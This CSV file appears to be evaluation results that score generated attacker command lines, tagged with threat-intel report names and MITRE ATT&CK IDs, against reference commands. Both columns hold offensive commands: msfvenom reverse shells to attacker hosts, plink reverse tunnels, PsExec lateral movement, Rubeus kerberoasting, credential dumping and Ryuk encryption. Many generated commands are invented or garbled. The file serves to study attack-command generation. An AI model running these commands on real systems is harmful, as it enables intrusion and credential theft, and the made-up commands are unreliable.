report,file,tool,input_command,matched_command,chrf_score,match_found
FORK_APT29,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,"Invoke-PSImage -Embed -InputFile ""<obfuscated_script.png>"" -OutputFile ""<output.png>""",`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"30,258",True
FORK_APT29,command_metasploit_TA0011_T1102.txt,metasploit,msfconsole -r <task_database_file>,`sudo msfconsole`,"29,384",True
FORK_APT29,command_plink_TA0010_T1048.txt,plink,plink.exe -no-sanitise-stdout -ssh <victim_ssh_user>@<victim_ssh_ip>,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","32,856",True
FORK_APT29,command_plink_TA0011_T1071.txt,plink,plink.exe -telnet <CnC_Server_IP> -P <port_number>,`plink.exe <domain_admin>@<bankfileserver_ip>`,"27,913",True
FORK_APT29,command_psexec_TA0011_T1105.txt,psexec,psexec \\<CnC_Server_IP> -s -u <username> -v <file_path>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","22,434",True
FORK_APT29,command_rubeus_TA0005_T1070.txt,rubeus,rubeus.exe kill,`rubeus.exe kerberoast /domain:oz.local`,"54,411",True
FORK_APT29,command_rubeus_TA0006_T1558.txt,rubeus,rubeus.exe triage,`rubeus.exe kerberoast /domain:oz.local`,"45,516",True
FORTINET_OILRIG,command_ryuk_TA0002_T1105.txt,ryuk,ryuk.exe --drop-bat-files,`ryuk.exe --encrypt --process-name notepad.exe`,"36,908",True
FORTINET_OILRIG,command_wmic_TA0002_T1047.txt,wmic,wmic /node:<c2_server_ip> /namespace:\\root\cimv2 path Win32_PingResult call Ping,"`wmic /node:#{""POS system""} process call create #{""executable""}`","19,692",True
GIGAMON1_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","59,855",True
GIGAMON1_FIN7,command_chrome_passwords_TA0002_T1204.txt,chrome passwords,chrome-passwords.exe -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","68,591",True
GIGAMON1_FIN7,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,"Invoke-PSImage -ScriptData ""base64:<encoded_script_here>"" -OutputFile <output_image_file>",`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"30,909",True
GIGAMON2_FIN7,command_adfind_TA0005_T1112.txt,adfind,"adfind -b <domain> -f ""(|(sAMAccountType=805306144)(|msDS-User-Account-Control-Computed:2))"" -dn <target_user>",`adfind.exe -f (objectcategory=computer) > ad_computers.txt`,"14,977",True
GIGAMON2_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","60,523",True
GIGAMON2_FIN7,command_chrome_passwords_TA0009_T1005.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","60,523",True
GIGAMON2_FIN7,command_invoke_psimage_TA0003_T1546.txt,invoke psimage,Invoke-PSImage -Script .\shim.ps1 -Out .\shim.png -Image .\shield.jpg,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"62,994",True
GIGAMON2_FIN7,command_psexec_TA0005_T1620.txt,psexec,"psexec \\target_machine -accepteula -nobanner -l -priority high cmd /c start /b ""path_to_dll"" /a /w","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","21,8",True
GIGAMON2_FIN7,command_psexec_TA0007_T1057.txt,psexec,psexec \\<target_computer> -u Administrator -p <password> -s cmd /c tasklist,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","17,38",True
GIGAMON3_FIN7,command_plink_TA0011_T1071.txt,plink,plink -sshlog <dns_tunnel_log_file>,"```sh
plink -ssh #{user}@#{server}
```","22,935",True
GIGAMON3_FIN7,command_rubeus_TA0005_T1027.txt,rubeus,rubeus asktgs /ticket:<base64(ticket.kirbi)> /enc:aes256,`rubeus.exe kerberoast /domain:oz.local`,"14,269",True
GRIZZLY_APT29,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,Invoke-PSImage -Script { Get-Content -Path <file_path> -ErrorAction SilentlyContinue },`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"30,351",True
GRIZZLY_APT29,command_psexec_TA0002_T1204.txt,psexec,psexec -l <user_name> <target_system>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","15,552",True
GRIZZLY_APT29,command_psexec_TA0011_T1105.txt,psexec,psexec \\<target_computer> -u <username> -p <password> cmd /c powershell.exe -ExecutionPolicy Bypass -File <ransomware_dll_path>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","24,836",True
InsideTheBreach_FIN6,command_chrome_passwords_TA0000_T1056.txt,chrome passwords,chrome --password-store=sync --dump-passwords <password_file_path>,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","24,189",True
INTEZER_OILRIG,command_chrome_passwords_TA0005_T1027.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","60,523",True
KASPERKY1_FIN7,command_chrome_passwords_TA0009_T1185.txt,chrome passwords,chrome-passwords -p > output.txt,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","46,422",True
KASPERKY1_FIN7,command_metasploit_TA0002_T1203.txt,metasploit,"msfconsole -x ""use exploit/windows/fileformat/ms03_026"" -x ""set payload windows/meterpreter/reverse_tcp"" -x ""set RHOST <target_ip>"" -x ""set RPORT 445"" -x ""exploit""","```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
```","42,009",True
KASPERKY1_FIN7,command_metasploit_TA0011_T1105.txt,metasploit,msfvenom -p windows/meterpreter/reverse_tcp <initial_downloader Payload> LHOST=<attacker_ip> LPORT=<attacker_port>,`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 --format psh -o meterpreter.ps1`,"51,889",True
KASPERKY2_FIN7,command_adfind_TA0007_T1082.txt,adfind,"adfind -b <domain_name> -f ""(&(objectCategory=Computer)(operatingSystem=*))"" -r",`adfind.exe -f (objectcategory=computer) > ad_computers.txt`,"32,495",True
KASPERKY2_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","59,855",True
KASPERKY2_FIN7,command_invoke_psimage_TA0011_T1105.txt,invoke psimage,Import-Module .\Invoke-PSImage.ps1,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"42,03",True
KASPERKY2_FIN7,command_paexec_TA0007_T1016.txt,paexec,PAExec @computers.txt -u <domain_admin> -p <password> -i -c ipconfig /all," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","38,387",True
KASPERKY2_FIN7,command_pupy_TA0001_T1078.txt,pupy,run loot_memory browser_process_id,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`","13,502",True
KASPERKY2_FIN7,command_pupy_TA0003_T1078.txt,pupy,run hashmon /path/to/process/memory,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`","13,026",True
KASPERKY2_FIN7,command_pupy_TA0004_T1078.txt,pupy,lazagne windows,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"22,745",True
KASPERKY2_FIN7,command_pupy_TA0005_T1078.txt,pupy,run Lazagne,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`","6,349",True
KASPERKY2_FIN7,command_ryuk_TA0003_T1547.txt,ryuk,"ryuk -e --process-name ""GRIFFON"" --drop-bat-files",`ryuk.exe --encrypt --process-name notepad.exe`,"36,507",True
KASPERKY2_FIN7,command_ryuk_TA0004_T1547.txt,ryuk,ryuk.exe --process-name <process_name> -e,`ryuk.exe --encrypt --process-name notepad.exe`,"54,851",True
KASPERKY2_FIN7,command_wmic_TA0002_T1047.txt,wmic,"wmic process call create ""notepad.exe""","`wmic /node:#{""POS system""} process call create #{""executable""}`","51,612",True
KASPERKY3_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","60,523",True
KASPERKY3_FIN7,command_chrome_passwords_TA0011_T1105.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","59,855",True
KASPERKY3_FIN7,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,invoke-psimage -e -i <image_file> -o <output_png>,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"22,833",True
KASPERKY3_FIN7,command_plink_TA0011_T1071.txt,plink,plink.exe -no-sanitise-stdout -batch <attacker_ssh_user>@<dns_server_ip>,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","42,552",True
KASPERSKY1_CARBANAK,command_chrome_passwords_TA0009_T1056.txt,chrome passwords,chrome-passwords -p <file_path_to_chrome_database>,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","33,365",True
KASPERSKY2_CARBANAK,command_metasploit_TA0002_T1203.txt,metasploit,msfconsole -r exploit.rb,`sudo msfconsole`,"41,271",True
KASPERSKY2_CARBANAK,command_psexec_TA0001_T1078.txt,psexec,psexec \-u <domain>\user2 \-p <password> -i 0 \\remote_system,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","22,96",True
KASPERSKY2_CARBANAK,command_psexec_TA0005_T1078.txt,psexec,psexec \\remote_system -u Domain\user1 -p <password>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","21,128",True
KASPERSKY2_CARBANAK,command_pupy_TA0004_T1055.txt,pupy,download C:\\Windows\\System32\\svchost.exe,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`","22,053",True
KASPERSKY2_CARBANAK,command_pupy_TA0004_T1134.txt,pupy,privesc_checker -s <os_type> -f <file_path>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"14,076",True
KASPERSKY2_CARBANAK,command_pupy_TA0005_T1055.txt,pupy,run memory_exec C:\\Windows\\System32\\svchost.exe privilege::debug,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"14,202",True
KASPERSKY2_CARBANAK,command_pupy_TA0005_T1070.txt,pupy,pupy <file_path> rm -rf,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`","13,455",True
KASPERSKY2_CARBANAK,command_pupy_TA0005_T1134.txt,pupy,getsystem <windows_system_privilege>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"18,173",True
MAGECART_FIN6,command_chrome_passwords_TA0011_T1056.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","64,495",True
MAGECART_FIN6,command_metasploit_TA0001_T1190.txt,metasploit,msfvenom -p windows/x86/shell_reverse_tcp LHOST=192.168.1.123 LPORT=4444 -e x86/shikata_ga_nai -f exe > payload.exe,`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 -f exe-service -o javamtsup.exe`,"38,36",True
MappingMitreToSandwormAPT_SANDWORM,command_chrome_passwords_TA0006_T1552.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","60,523",True
MappingMitreToSandwormAPT_SANDWORM,command_ryuk_TA0005_T1070.txt,ryuk,ryuk.exe --mount-shares,`ryuk.exe --encrypt --process-name notepad.exe`,"38,671",True
MappingMitreToSandwormAPT_SANDWORM,command_ryuk_TA0011_T1001.txt,ryuk,ryuk.exe --encrypt,`ryuk.exe --encrypt --process-name notepad.exe`,"72,768",True
MappingMitreToSandwormAPT_SANDWORM,command_ryuk_TA0040_T1490.txt,ryuk,ryuk.exe /delete-backups,`ryuk.exe --encrypt --process-name notepad.exe`,"29,303",True
MappingMitreToSandwormAPT_SANDWORM,command_windows_credential_editor_TA0006_T1003.txt,windows credential editor,wce -w,"```sh
wce.exe -w
```","33,601",True
MAZE_FIN6,command_psexec_TA0003_T1078.txt,psexec,psexec -u <domain_admin_account> -p <password> \\remote_system -s,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","21,071",True
MICROSOFT_APT29,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","59,855",True
MICROSOFT_APT29,command_paexec_TA0011_T1219.txt,paexec,paexec -h -i -c <dll_name>," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","17,01",True
MICROSOFT_APT29,command_plink_TA0011_T1071.txt,plink,"plink.exe -i ""<private_key_file>"" <attacker_ssh_user>@<server_ip> -R 80:localhost:80","`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","50,614",True
MICROSOFT_APT29,command_psexec_TA0011_T1105.txt,psexec,psexec \\<target_computer> -s -nobanner -accepteula -c <file_path>\cyzfc.dat,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","23,917",True
MoreEggs_FIN6,command_adfind_TA0043_T1589.txt,adfind,adfind -sc whoami,"adfind -f ""(objectcategory=group)""`","29,853",True
MoreEggs_FIN6,command_windows_credential_editor_TA0002_T1059.txt,windows credential editor,wce -l,"```sh
wce.exe -w
```","23,998",True
MORPHISEC_FIN6,command_metasploit_TA0004_T1055.txt,metasploit,msfpayload -p windows/meterpreter/reverse_tcp_lport=<lport> -e base64 -i encode_final_payload,"```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
```","41,109",True
MORPHISEC_FIN6,command_metasploit_TA0005_T1055.txt,metasploit,"msfpayload windows/shell/reverse_tcp -f powershell -X 32 -c ""encode_final_payload"" -o remove_comspec -p <shellcode>","```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
```","28,358",True
MORPHISEC_FIN6,command_metasploit_TA0011_T1219.txt,metasploit,use auxiliary/scanner/telnet/lantronix_telnet_password,"```sh
msf> use auxiliary/admin/smb/psexec_ntdsgrab
```","27,641",True
MORPHISEC_FIN6,command_plink_TA0008_T1021.txt,plink,plink.exe -i key attacker_ssh_user@remote_server -R 22:localhost:22,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","50,951",True
MORPHISEC_FIN6,command_rubeus_TA0003_T1547.txt,rubeus,rubeus.exe klist /purge,`rubeus.exe kerberoast /domain:oz.local`,"45,406",True
MORPHISEC_FIN6,command_rubeus_TA0004_T1547.txt,rubeus,rubeus.exe purge /luid:<logon_session_id>,`rubeus.exe kerberoast /domain:oz.local`,"26,94",True
MORPHISEC_FIN6,command_wmic_TA0002_T1047.txt,wmic,"wmic process call ""winmgmt start"" /RECORD:C:\temp\wmi_record.xml","`wmic /node:#{""POS system""} process call create #{""executable""}`","25,596",True
MORPHISEC_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords.exe,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","72,548",True
MORPHISEC_FIN7,command_psexec_TA0002_T1053.txt,psexec,"psexec \\%computername% -u <user> -n s -a n,n,... cmd /c powershell -file <powershell_script_file_path>","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","21,512",True
MORPHISEC_FIN7,command_psexec_TA0003_T1053.txt,psexec,"psexec \\<victim_computer> -u <user_name> -c -a 1,2 cmd /c powershell.exe -File <powershell_script_path>","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","26,232",True
MORPHISEC_FIN7,command_psexec_TA0004_T1053.txt,psexec,"psexec \\<target_computer> -u <user_name> -n <timeout> -l -c -a <cpu_cores> cmd /c ""powershell -ExecutionPolicy Bypass -File <script_path>""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","20,182",True
MORPHISEC_FIN7,command_pupy_TA0004_T1055.txt,pupy,download 'C:\\Windows\\System32\\calc.exe',"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`","21,714",True
MYSTERY_APT29,command_psexec_TA0002_T1059.txt,psexec,psexec \\target_system -u <username> -p <password> taskkill /f /im <process_name>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","22,618",True
NotPetya_SANDWORM,command_ryuk_TA0040_T1485.txt,ryuk,ryuk.exe --encrypt-files <file_pattern>,`ryuk.exe --encrypt --process-name notepad.exe`,"48,29",True
OlympicDestroyer_SANDWORM,command_adfind_TA0007_T1012.txt,adfind,"adfind -f ""HKLM\\SOFTWARE""","adfind -f ""(objectcategory=group)""`","28,155",True
OlympicDestroyer_SANDWORM,command_paexec_TA0007_T1046.txt,paexec,"paexec -s -u <username> -p <password> \\remote_host ""services.msc"""," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","27,312",True
OlympicDestroyer_SANDWORM,command_plink_TA0007_T1018.txt,plink,plink.exe -ssh <attacker_ssh_user>@*,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","58,936",True
OlympicDestroyer_SANDWORM,command_plink_TA0008_T1021.txt,plink,plink -ssh login.example.com -l attacker_username,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","29,13",True
OlympicDestroyer_SANDWORM,command_psexec_TA0002_T1059.txt,psexec,psexec.exe -accepteula -nobanner -i -e <file_path>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","30,223",True
OlympicDestroyer_SANDWORM,command_psexec_TA0040_T1489.txt,psexec,"psexec \\target-system -s -u SYSTEM -d -wait -accepteula cmd /c ""taskkill /im <service_name>.exe""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","26,099",True
OlympicDestroyer_SANDWORM,command_ryuk_TA0005_T1027.txt,ryuk,ryuk.exe --obfuscate --files <file_path>,`ryuk.exe --encrypt --process-name notepad.exe`,"28,571",True
OlympicDestroyer_SANDWORM,command_ryuk_TA0006_T1003.txt,ryuk,ryuk.exe --dump-credentials,`ryuk.exe --encrypt --process-name notepad.exe`,"35,316",True
OlympicDestroyer_SANDWORM,command_wmic_TA0002_T1047.txt,wmic,"wmic path Win32_Process call Create ""cmd /c calc.exe""","`wmic /node:#{""POS system""} process call create #{""executable""}`","32,333",True
PICK_FIN6,command_adfind_TA0007_T1016.txt,adfind,adfind -sc fo:<object_name>,"adfind -f ""(objectcategory=group)""`","35,485",True
PICK_FIN6,command_chrome_passwords_TA0005_T1078.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","60,523",True
PICK_FIN6,command_chrome_passwords_TA0007_T1087.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","59,855",True
PICK_FIN6,command_metasploit_TA0001_T1190.txt,metasploit,"msfconsole -x ""use exploit/multi/http/... ; set RHOST 192.168.0.4 ; set RPORT 80 ; set PAYLOAD windows/meterpreter/reverse_tcp ; run""","```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
```","48,903",True
PICK_FIN6,command_metasploit_TA0003_T1543.txt,metasploit,"meterpreter > reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows"" /v ""RandomServiceName"" /t REG_SZ /d ""<random_service_name>""","    ```
    set CMD ""reg.exe delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Java-Update /f""
    exploit
    ```","23,054",True
PICK_FIN6,command_metasploit_TA0004_T1543.txt,metasploit,"msfconsole -x ""use windows/service/powershell_service; set PAYLOAD windows/powershell_reverse_tcp; set LHOST <attacker_IP>; set LPORT <attacker_port>; exploit""",`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 -f exe-service -o javamtsup.exe`,"26,568",True
PICK_FIN6,command_metasploit_TA0005_T1027.txt,metasploit,msf6 > use exploit/http/foscam_rce,"```
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_https
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
    ```","24,731",True
PICK_FIN6,command_metasploit_TA0011_T1105.txt,metasploit,fetch_payload windows http/x64/meterpreter/reverse_tcp,"```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
```","57,905",True
PICK_FIN6,command_paexec_TA0002_T1569.txt,paexec,PAExec \\<target_server> -u <username> -p <password> -i -c MyApp.exe," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","23,157",True
PICK_FIN6,command_paexec_TA0005_T1036.txt,paexec,paexec -i -s mstdc," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","15,546",True
PICK_FIN6,command_paexec_TA0008_T1021.txt,paexec,PAExec \\{server_IP_address} -u {username} -p {password} -i -c MyApp.exe," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","19,21",True
PICK_FIN6,command_psexec_TA0001_T1078.txt,psexec,psexec -i \\<remote_system> -u <attacker_username> -p <attacker_password>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","23,319",True
POSH_APT29,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","59,855",True
POSH_APT29,command_chrome_passwords_TA0005_T1027.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","60,523",True
POSH_APT29,command_chrome_passwords_TA0011_T1573.txt,chrome passwords,chrome-passwords -p <url> -u <username> -c <blob_column_name>,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","29,812",True
POSH_APT29,command_paexec_TA0011_T1105.txt,paexec,"paexec -csrc ""C:\Path\To\AdditionalCode.exe"" -dfr"," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","23,691",True
POSH_APT29,command_rubeus_TA0002_T1106.txt,rubeus,rubeus.exe wmi create /class:<new_wmi_class_name> /prop:text=<property_name>:<property_value>,`rubeus.exe kerberoast /domain:oz.local`,"15,087",True
POSH_APT29,command_rubeus_TA0003_T1546.txt,rubeus,"rubeus.exe wmiexec /smowmi /c:""powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File <file_path>",`rubeus.exe kerberoast /domain:oz.local`,"14,141",True
POSH_APT29,command_rubeus_TA0005_T1546.txt,rubeus,""" and enclosed in backticks.",`rubeus.exe kerberoast /domain:oz.local`,"11,888",True
POSH_APT29,command_ryuk_TA0005_T1036.txt,ryuk,ryuk.exe -p <process_name>,`ryuk.exe --encrypt --process-name notepad.exe`,"49,836",True
POSH_APT29,command_wmic_TA0002_T1047.txt,wmic,"wmic PATH win32_process CALL create ""C:\Windows\System32\svchost.exe""","`wmic /node:#{""POS system""} process call create #{""executable""}`","24,682",True
POWER_APT29,command_chrome_passwords_TA0042_T1566.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","60,523",True
POWER_APT29,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,Invoke-PSImage -ScriptBlock {Invoke-Mimikatz} -OutputFile <image_file_name>.png,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"36,562",True
POWER_APT29,command_rubeus_TA0005_T1112.txt,rubeus,rubeus.exe reg add /key:HKCU\Software\Microsoft\Windows\CurrentVersion\Run /value:PowerDuke /type:string,`rubeus.exe kerberoast /domain:oz.local`,"14,447",True
POWER_APT29,command_rubeus_TA0007_T1033.txt,rubeus,rubeus s4u /ptt /tgt <placeholder>,`rubeus.exe kerberoast /domain:oz.local`,"19,142",True
POWER_APT29,command_rubeus_TA0007_T1083.txt,rubeus,rubeus ls <directory_path>,`rubeus.exe kerberoast /domain:oz.local`,"20,821",True
POWER_APT29,command_windows_credential_editor_TA0001_T1059.txt,windows credential editor,wce.exe dump kerberos,"```sh
wce.exe -w
```","28,02",True
